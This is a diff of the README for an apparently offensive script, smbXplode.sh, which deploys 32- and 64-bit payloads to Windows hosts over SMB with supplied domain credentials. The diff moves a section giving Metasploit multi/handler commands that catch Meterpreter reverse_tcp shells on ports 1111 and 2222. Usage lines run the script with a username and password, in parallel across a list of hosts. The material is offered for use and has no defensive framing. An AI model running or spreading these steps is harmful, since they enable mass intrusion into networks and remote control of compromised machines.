@@ -24,27 +24,6 @@ Also notice that due to the use of net rpc, you need to migrate first thing afte
 Before running this script, simply make sure that you have two payload files (32 & 64 bit). Make sure to update the name of the files accordingly in the script. 
 
 
-#### Metasploit Handler
-Make sure to have your Metasploit handler listening for both payloads ( you can listen two different ports for 32, and 64 ).
-Also, make sure you select the correct payload for the handler, I will demonstrate the reverce_tcp (32 and 64) 
-
-Example :
-
-```
-use exploit/multi/handler
-set autorunscript multi_console_command -rc /path/to/msfcommands.rc
-set ExitOnSession false
-set payload windows/x64/meterpreter/reverse_tcp
-set lhost 0.0.0.0
-set lport 1111
-run -j -z
-set payload windows/meterpreter/reverse_tcp
-set lport 2222
-run -j -z
-```
-
-Now make sure that your connect back payloads are configured to match those ports and payload type. 
-
 #### Single Host
 To run the script simply use the following syntax
 ```	
@@ -70,4 +49,23 @@ Running against host ips file
 cat hosts.txt | parallel -j 5 ./smbXplode.sh domain tito Password2015
 ```
 
+#### Metasploit Handler
+Make sure to have your Metasploit handler listening for both payloads ( you can listen two different ports for 32, and 64 ).
+Also, make sure you select the correct payload for the handler, I will demonstrate the reverce_tcp (32 and 64) 
 
+Example :
+
+```
+use exploit/multi/handler
+set autorunscript multi_console_command -rc /path/to/msfcommands.rc
+set ExitOnSession false
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 1111
+run -j -z
+set payload windows/meterpreter/reverse_tcp
+set lport 2222
+run -j -z
+```
+
+Now make sure that your connect back payloads are configured to match those ports and payload type. 
